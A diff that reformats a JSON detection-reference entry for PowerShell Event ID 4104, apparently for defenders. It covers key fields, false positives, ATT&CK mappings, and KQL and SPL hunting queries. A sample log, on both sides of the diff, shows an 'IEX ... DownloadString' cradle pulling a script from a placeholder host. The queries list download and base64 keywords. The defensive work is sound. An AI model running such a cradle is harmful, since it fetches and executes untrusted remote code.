@@ -1,20 +1,54 @@
 {
-  "id": "4104", "source": "windows_security", "category": "PowerShell", "name": "PowerShell Script Block Logging", "priority": "P1",
-  "applicable_version": "Windows PowerShell 5.0 and later with Script Block Logging enabled", "last_reviewed": "2026-07-10",
-  "definition": "PowerShell Event ID 4104 records script block content and is one of the highest-value Windows telemetry sources for detecting malicious PowerShell execution.",
-  "trigger_scenarios": "The PowerShell operational log records this event when Script Block Logging is enabled through policy or configuration. Large scripts can be split across multiple events sharing a ScriptBlockId.",
-  "key_fields": [
-    { "field": "ScriptBlockText", "explanation": "The deobfuscated PowerShell content captured by the engine. It exposes commands, functions, URLs, encoded payload handling, and execution logic." },
-    { "field": "ScriptBlockId", "explanation": "A unique identifier for the script block. Use it to group fragments when a long script is recorded across multiple events." },
-    { "field": "Path", "explanation": "The script file path when PowerShell knows it. An empty path may indicate interactive or in-memory execution." },
-    { "field": "UserId / HostApplication", "explanation": "The executing identity and host application context. They help distinguish user activity, scheduled tasks, remote management, and application-hosted PowerShell." }
-  ],
-  "false_positives": ["Configuration management, login scripts, and administrative automation can legitimately contain download, remoting, and encoded-content patterns.", "Security products and management agents may invoke PowerShell with complex scripts at scale.", "Developer and operations hosts often have more diverse PowerShell activity than user workstations."],
-  "related_event_ids": ["4688", "4103", "4624"],
-  "attck_mapping": [{ "technique_id": "T1059.001", "technique_name": "Command and Scripting Interpreter: PowerShell" }, { "technique_id": "T1027", "technique_name": "Obfuscated Files or Information" }],
-  "detection_notes": "Search script content for download cradles, base64 decoding, reflection, AMSI bypass attempts, credential access, and execution from unusual paths. Reassemble multi-part script blocks before triage, then correlate with 4688 command lines, 4624 sessions, and outbound network telemetry. Baseline known automation by signed script path, host role, and service identity rather than suppressing keywords globally.",
-  "kql_snippet": "Event\n| where Source == \"Microsoft-Windows-PowerShell\" and EventID == 4104\n| where RenderedDescription has_any (\"FromBase64String\", \"IEX\", \"DownloadString\", \"Invoke-WebRequest\")\n| project TimeGenerated, Computer, UserName, RenderedDescription\n| order by TimeGenerated desc",
-  "spl_snippet": "index=wineventlog source=\"WinEventLog:Microsoft-Windows-PowerShell/Operational\" EventCode=4104\n| search ScriptBlockText IN (\"*FromBase64String*\", \"*DownloadString*\", \"*Invoke-WebRequest*\")\n| table _time, host, UserId, ScriptBlockId, Path, ScriptBlockText",
-  "sample_log": "EventCode: 4104\nUserId: CORP\\jsmith\nScriptBlockId: 11111111-2222-3333-4444-555555555555\nPath: \nScriptBlockText: IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/p.ps1')",
-  "source_url": "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows"
+    "id":  "4104",
+    "source":  "windows_security",
+    "category":  "PowerShell",
+    "name":  "PowerShell Script Block Logging",
+    "priority":  "P1",
+    "applicable_version":  "Windows PowerShell 5.0 and later with Script Block Logging enabled",
+    "last_reviewed":  "2026-07-10",
+    "definition":  "PowerShell Event ID 4104 records script block content and is one of the highest-value Windows telemetry sources for detecting malicious PowerShell execution.",
+    "trigger_scenarios":  "The PowerShell operational log records this event when Script Block Logging is enabled through policy or configuration. Large scripts can be split across multiple events sharing a ScriptBlockId.",
+    "key_fields":  [
+                       {
+                           "field":  "ScriptBlockText",
+                           "explanation":  "The deobfuscated PowerShell content captured by the engine. It exposes commands, functions, URLs, encoded payload handling, and execution logic."
+                       },
+                       {
+                           "field":  "ScriptBlockId",
+                           "explanation":  "A unique identifier for the script block. Use it to group fragments when a long script is recorded across multiple events."
+                       },
+                       {
+                           "field":  "Path",
+                           "explanation":  "The script file path when PowerShell knows it. An empty path may indicate interactive or in-memory execution."
+                       },
+                       {
+                           "field":  "UserId / HostApplication",
+                           "explanation":  "The executing identity and host application context. They help distinguish user activity, scheduled tasks, remote management, and application-hosted PowerShell."
+                       }
+                   ],
+    "false_positives":  [
+                            "Configuration management, login scripts, and administrative automation can legitimately contain download, remoting, and encoded-content patterns.",
+                            "Security products and management agents may invoke PowerShell with complex scripts at scale.",
+                            "Developer and operations hosts often have more diverse PowerShell activity than user workstations."
+                        ],
+    "related_event_ids":  [
+                              "4688",
+                              "4103",
+                              "4624"
+                          ],
+    "attck_mapping":  [
+                          {
+                              "technique_id":  "T1059.001",
+                              "technique_name":  "Command and Scripting Interpreter: PowerShell"
+                          },
+                          {
+                              "technique_id":  "T1027",
+                              "technique_name":  "Obfuscated Files or Information"
+                          }
+                      ],
+    "detection_notes":  "Search script content for download cradles, base64 decoding, reflection, AMSI bypass attempts, credential access, and execution from unusual paths. Reassemble multi-part script blocks before triage, then correlate with 4688 command lines, 4624 sessions, and outbound network telemetry. Baseline known automation by signed script path, host role, and service identity rather than suppressing keywords globally. Mapped ATT\u0026CK techniques: T1059.001, T1027.",
+    "kql_snippet":  "Event\n| where Source == \"Microsoft-Windows-PowerShell\" and EventID == 4104\n| where RenderedDescription has_any (\"FromBase64String\", \"IEX\", \"DownloadString\", \"Invoke-WebRequest\")\n| project TimeGenerated, Computer, UserName, RenderedDescription\n| order by TimeGenerated desc",
+    "spl_snippet":  "index=wineventlog source=\"WinEventLog:Microsoft-Windows-PowerShell/Operational\" EventCode=4104\n| search ScriptBlockText IN (\"*FromBase64String*\", \"*DownloadString*\", \"*Invoke-WebRequest*\")\n| table _time, host, UserId, ScriptBlockId, Path, ScriptBlockText",
+    "sample_log":  "EventCode: 4104\nUserId: CORP\\jsmith\nScriptBlockId: 11111111-2222-3333-4444-555555555555\nPath: \nScriptBlockText: IEX (New-Object Net.WebClient).DownloadString(\u0027https://example.invalid/p.ps1\u0027)",
+    "source_url":  "https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows"
 }
